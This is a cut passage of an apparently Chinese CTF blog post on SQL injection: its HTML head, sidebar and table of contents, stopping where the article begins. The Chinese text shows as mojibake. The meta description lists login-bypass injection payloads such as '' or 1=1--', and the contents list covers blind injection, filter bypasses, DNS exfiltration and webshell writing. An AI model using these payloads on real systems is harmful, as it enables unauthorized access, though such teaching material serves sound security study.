<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>SQLæ³¨å…¥ | Lazzaro</title><meta name="description" content="ä¸‡èƒ½å¯†ç 123456789admin&#x27; --admin&#x27; #admin&#x27;&#x2F;\*&#x27; or 1&#x3D;1--&#x27; or 1&#x3D;1#&#x27; or 1&#x3D;1&#x2F;*&#x27;) or &#x27;1&#x27;&#x3D;&#x27;1--&#x27;) or (&#x27;1&#x27;&#x3D;&#x27;1-- 1&#x27;^1#       (Falseæ³¨å…¥) â€‹"><meta property="og:type" content="article"><meta property="og:title" content="SQLæ³¨å…¥"><meta property="og:url" content="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="ä¸‡èƒ½å¯†ç 123456789admin&#x27; --admin&#x27; #admin&#x27;&#x2F;\*&#x27; or 1&#x3D;1--&#x27; or 1&#x3D;1#&#x27; or 1&#x3D;1&#x2F;*&#x27;) or &#x27;1&#x27;&#x3D;&#x27;1--&#x27;) or (&#x27;1&#x27;&#x3D;&#x27;1-- 1&#x27;^1#       (Falseæ³¨å…¥) â€‹"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/SQL%E7%9B%B2%E6%B3%A821.png"><meta property="article:published_time" content="2020-05-15T17:43:10.000Z"><meta property="article:modified_time" content="2025-04-19T09:09:46.208Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="SQL"><meta property="article:tag" content="æ³¨å…¥"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/SQL%E7%9B%B2%E6%B3%A821.png"><link rel="canonical" href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">53</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.88px">2021èµ›</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.63px">2022èµ›</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.75px">2023èµ›</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.25px">2024èµ›</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13.38px">2025èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.13px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.25px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.13px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.13px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.5px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">åé‡å­å¯†ç </a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%A0%86/" style="font-size:13px">å †</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.13px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">æ ˆ</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">æ··æ·†</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.13px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.5px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.13px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.25px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/12/">åäºŒæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">åæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">å…«æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">å…­æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">åäºŒæœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">åä¸€æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">ä¸‰æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">åä¸€æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">ä¹æœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">äº”æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">äºŒæœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">ä¸€æœˆ 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">åäºŒæœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">ä¹æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">ä¸ƒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">å…­æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">äº”æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">äºŒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">ä¸€æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">ä¸‰æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">ä¸‡èƒ½å¯†ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">æ‰‹æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4%EF%BC%88%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">æ­£å¸¸æ³¨å…¥æ­¥éª¤ï¼ˆè”åˆæŸ¥è¯¢ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.2.</span> <span class="toc-text">æ— å›æ˜¾</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">ç›²æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">å¸ƒå°”ç›²æ³¨</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">æ—¶é—´ç›²æ³¨</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.3.</span> <span class="toc-text">limitæ³¨å…¥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.4.</span> <span class="toc-text">updateæ³¨å…¥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.5.</span> <span class="toc-text">insertæ³¨å…¥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.6.</span> <span class="toc-text">order byæ³¨å…¥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#group-by%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.7.</span> <span class="toc-text">group byæ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">å †å æ³¨å…¥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">äºŒæ¬¡æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1urldecode%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.1.</span> <span class="toc-text">äºŒæ¬¡urldecodeæ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">2.6.</span> <span class="toc-text">æ–‡ä»¶æ“ä½œ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rogue-Mysql-Server"><span class="toc-number">2.7.</span> <span class="toc-text">Rogue Mysql Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Quine"><span class="toc-number">2.8.</span> <span class="toc-text">Quine</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%88bypass%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">ç»•è¿‡ï¼ˆbypassï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.1.</span> <span class="toc-text">ç©ºæ ¼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">3.2.</span> <span class="toc-text">å•åŒå¼•å·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">3.3.</span> <span class="toc-text">é€—å·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%89%E5%8F%B7"><span class="toc-number">3.4.</span> <span class="toc-text">ç­‰å·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7"><span class="toc-number">3.5.</span> <span class="toc-text">åˆ†å·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#and-or"><span class="toc-number">3.6.</span> <span class="toc-text">and &#x2F; or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#union"><span class="toc-number">3.7.</span> <span class="toc-text">union</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#select"><span class="toc-number">3.8.</span> <span class="toc-text">select</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-number">3.9.</span> <span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#where"><span class="toc-number">3.10.</span> <span class="toc-text">where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">3.11.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii"><span class="toc-number">3.12.</span> <span class="toc-text">ascii</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr"><span class="toc-number">3.13.</span> <span class="toc-text">substr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#as"><span class="toc-number">3.14.</span> <span class="toc-text">as</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#if"><span class="toc-number">3.15.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by"><span class="toc-number">3.16.</span> <span class="toc-text">order by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">3.17.</span> <span class="toc-text">å…¶ä»–å…³é”®å­—</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.18.</span> <span class="toc-text">æ‹¬å·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">3.19.</span> <span class="toc-text">æ•°å­—</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">3.20.</span> <span class="toc-text">mysqlç³»ç»Ÿåº“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">3.21.</span> <span class="toc-text">sysç³»ç»Ÿåº“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%88or-column-%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-number">3.22.</span> <span class="toc-text">æ— åˆ—åæ³¨å…¥ï¼ˆor &#x2F; column è¢«è¿‡æ»¤ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%AD%A5%E8%A1%A8%E6%95%B0%E6%8D%AE-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">3.23.</span> <span class="toc-text">åŒæ­¥è¡¨æ•°æ® - ä¸»ä»å¤åˆ¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.24.</span> <span class="toc-text">è¿œç¨‹è¿æ¥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87"><span class="toc-number">3.25.</span> <span class="toc-text">å‚è€ƒæ–‡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%EF%BC%88OOB%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">DNSå¸¦å¤–æ³¨å…¥ï¼ˆOOBï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF"><span class="toc-number">5.</span> <span class="toc-text">UDF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLite"><span class="toc-number">6.</span> <span class="toc-text">SQLite</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E8%A1%A8%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.1.</span> <span class="toc-text">å†…ç½®è¡¨æŸ¥è¯¢</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-number">6.2.</span> <span class="toc-text">å†™webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NoSQL"><span class="toc-number">7.</span> <span class="toc-text">NoSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MongoDB"><span class="toc-number">7.1.</span> <span class="toc-text">MongoDB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XPath"><span class="toc-number">8.</span> <span class="toc-text">XPath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">9.</span> <span class="toc-text">å¸¸ç”¨è„šæœ¬</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">9.1.</span> <span class="toc-text">å¸ƒå°”ç›²æ³¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">9.2.</span> <span class="toc-text">æ—¶é—´ç›²æ³¨</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-web-SQLæ³¨å…¥" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">SQLæ³¨å…¥</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/" class="article-date"><time datetime="2020-05-15T17:43:10.000Z" itemprop="datePublished">2020-05-16</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/web/">web</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="article-tag-link-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">æ³¨å…¥</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/" class="leancloud_visitors" data-flag-title="SQLæ³¨å…¥"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h3 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" 